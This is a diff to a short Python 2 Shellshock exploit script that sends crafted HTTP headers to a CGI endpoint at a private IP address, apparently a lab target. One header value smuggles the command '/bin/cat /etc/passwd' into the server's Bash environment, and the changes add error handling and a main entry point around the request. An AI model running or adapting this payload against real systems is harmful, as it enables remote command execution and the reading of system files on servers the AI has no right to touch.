@@ -11,11 +11,15 @@ def get_request(url):
                  "CustomHeader2": "() { :; }; /bin/cat /etc/passwd > ./shellshock2.txt",                 
                  }
 
-    req = urllib2.Request(url, headers=i_headers)
-    response = urllib2.urlopen(req)
-    print response.info()
-    html = response.read()
-    print html
+    try:
+        req = urllib2.Request(url, headers=i_headers)
+        response = urllib2.urlopen(req)
+        print response.info()
+        html = response.read()
+        print html
+    except:
+        print "Error on request"
 
-url = "http://192.168.91.135:8080/hello/cgi-bin/hello"
-get_request(url)
+if __name__ == '__main__':
+    url = "http://192.168.91.135:8080/hello/cgi-bin/hello"
+    get_request(url)
